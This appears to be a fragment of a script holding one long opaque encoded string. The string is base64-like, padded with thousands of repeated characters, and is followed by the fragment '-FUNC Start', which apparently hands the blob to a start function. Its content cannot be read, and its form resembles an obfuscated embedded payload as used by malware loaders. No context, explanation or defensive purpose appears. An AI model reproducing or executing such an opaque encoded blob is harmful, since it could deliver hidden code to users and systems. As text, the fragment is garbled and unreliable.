jRSJPIkoidCJjIvMi/CJwIXkh3iHhIVMgGi95LTIsjyywKxApLylfKR4oGCgMKD0oSSh9KG4okij1KBdnFhc/FxcXCSdUJ4wnNCVeJUMlZyWJJbwlTCPUIxciDCIxIj0iOCIXlxYXzxcXFwwnUydMJwImOSa4Ju4m6SYFJQslIiVxJdgl8iX8JeYl6iUTJAUkMyQ+JCEkKyR4JJAkuSTbJMAkGCNVI3AjjyMVIkkigiLCIhQhNyGnIY0g1yDNIPwgli/bL8svXC52LrMuzS73Lictdi1gLZItgi2ILbMtrS3ULcwt9i0GLJ0svyyuLKks0yzdLMIs8SzvLOgsEitGK2YrbyueK4crpyugK6kr7SsQKjIqUSpNKo4qsyqlKtIq9ipTKVgpcSmaKcgp8ikgKH0omyjEKOAoFxcXhxYX2xcXFwonJSdHJ5IniSe0J6cnoCfCJ+0nXyZ3JnImBCU9JSclKiVGJXwllSWeJZglryXFJf8lDCQ0JE8keSSIJLMkwiQSIxojVyNSI34jZyOKI7IjqyPEI44iLiFSIU8heCFjIZghuyH0IQQgMSAjIJwgjCCjINcgxCD8IGAv8S9eLpYu+S4OLWothC3eLcgt5C0QLGIslSyeLI4s7ywCKz4rdSuZK40rvyvZK8sr/CvtKxwqNSonKigqWSplKs4qkynhKQoojygXtxYXoxcXFxAnNScnJygnWSdKJ3snjye7J9UnBSYJJlcmbyaYJscmYCWSJbklEiQPJDckJyQsJIYk/iQCI7cjriPEI/sjcSJWIYYh8CF0IG8g0SAmL0gv0S/yL+QvNi6PLrEuoy7vLukuXS16LWMtmi2nLaAtfSyiLNEs+ywaKy8rXytHK0IrSitnK6Ar0SvBK+Ir7CsIKkgqeSr9KgUpQymFKaQpxCmaKK8o2ijLKPso6igXpxYXbxcXFxQnACc4J4EnsifVJ/gn7CccJg4mgSa1JhglYyWDJaQlwyUbJDYkayS5JOMkhyOnIy8iUiJ1IpsiiiK8IqAi5yIMIXchkiG8IcshfSCZIIsgzSAMLzUvYC/nLwwuWS5mLnotCCxVLJcspCzxLB4rUCsX1xYXdxcXF2MmbyZrJpcmkyafJoMmjyanJqMmtySzJL8kuySnJKMk3yTbJMck5yTjJO8kfyh7KGcoYyhvKGsovyi7KKcooyivKKso1yjTKN8o2yjHKMMozyjLKPco8ygXxxYXNxcXF9snxyfDJ/8n+yfnJzsmJyYNLAksNSwxLBf3FhcrFxcXWyJHIkMiTyKrKdMp2ynDKcsp8yn7KeMp6ykTKBsoAygLKDMoOygjKCsoUyhbKEMoSyhzKBfnFhfbFxcX3yLbIsciwyLPIssi9yLzIv8i+yLnIuMi7yLrIhchEyEfIRshByEDIQ8hCyE3ITMhPyE7ISchIyEvISshVyFTIV8hWyFHIUMhTyFLIXchcyF/IXshZyFjIW8hayGXIZMhnyGbIYchgyGPIYshtyGzIb8huyGnIaMhryGrIdch0yHfIdshxyHDIc8hyyH3IfMh/yH7Iech4yHvIeshFyATIB8gGyAHIAMgDyALIDcgMyA/IDsgJyAjIC8gKyBXIFMgXyAXFxcXFRfLFhcXiya3JrMmvya7Jqcm4ybvJhslByU3JTMlOyVTJUMlTyV/JXslYyWbJYsltyWnJaMlryXXJc8l/yX7JeslFyQTJBskMyQjJC8kXyRbJEckTyRnJJckkySDJI8kiySzJKsk1yTPJP8k+yQXIxMjAyMPIwsjMyMrI1sjRyN3I3MjeyOTI4MjjyO/I7sjoyPbI8sj9yPnI+Mj7yMXIg8iPyI7IisiVyJfInciZyJjIpMinyKPIosityK/ItcixyLDIvMi/yL7IuMiGyELITchJyEjIS8hKyFTIUshqyHHIcsh8yETIBsgAyALIDMgOyAjIFsgdyB7IGMggyCLILMguyCjIKsg0yDbIMMgyyDzIPsg6yAfLz8vJy8rL0svfy+fL4Mvoy+rL9Mv3y/HL/Mv+y8XLgcuNy5bLkMuby6bLosusy67Lq8uzy7LLvcu/y4TLTctKy1fLX8tZy1rLactxy3nLQcsJyxHLGcshyy7LKcsxyz7LOcsBysnK0crZyuHK4srryvTK/crFyo3Klcqdyp7Kp8qvyrfKv8qHyk/KScpIylbKUcpdymTKYcpjynfKccpwyn7KecpGygHKA8oNyg/KDsoIyhfKHMofyiTKJ8ovyjfKP8oFwcVFycXFxcTJx8nPydfJ38nYyeHJ6cnxyf7J+cn7ycbJgMmCyYzJj8mOyYjJl8mFzcVFwMXFxcXJ6shzyHnIR8gFxcXJxUXxxcXF08gSyB3IHMgfyB7IGcgYyBvIGsglyCTIJ8gmyCHIIMgjyCLILcgsyC/ILsgpyCjIK8gqyDXINMg3yDbIMcgwyDPIMsg9yDzIP8g+yDnIOMg7yDrIBcvEy8fLxsvBy8DLw8vCy83LzMvPy87LycvIy8vLysvVy9TL18vWy9HL0MvTy9LL3cvcy9/L3svZy9jL28vay+XL5Mvny+bL4cvgy+PL4svty+zL78vuy/fL/MvEy4zLlcuRy5/Lpcujy7HLs8uRytDKxcXF1cVF0MWFxfvJu8l6yUXJBMkHyQbJAckAyQPJAskNyQzJD8kOyQnJCMkLyQrJFckUyRfJFskRyRDJE8kSyR3JHMkfyR7JGckYyRvJGsklySTJJ8kmySHJIMkjySLJLckpySjJK8kqyTXJNMk3yTbJMckwyTPJMsk9yTzJP8k+yTnJOMk7yTrJBcjEyMfIxsjByMDIw8jCyM3IzMjPyM7IycjIyMvIysjVyNTI18jWyNHI0MjTyOvI98jzyP/I+8jCyI/IjsiJyIjIi8iKyJXIlsiRyJDIk8iSyJ3InMifyJ7ImciYyI/ITshZyA/LjsuJy4jLi8uKy5XLlMuXy5bLk8uSy53LnMufy57LmcuYy5vLmsuly7DLssu8y77LuMu6y4TLRstAy0LLTMtOy0jLSstUy1bLUMtSy1zLXstYy1rLZMtmy2DLYstsy27LaMt2yr7KhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX"  -FUNC Start
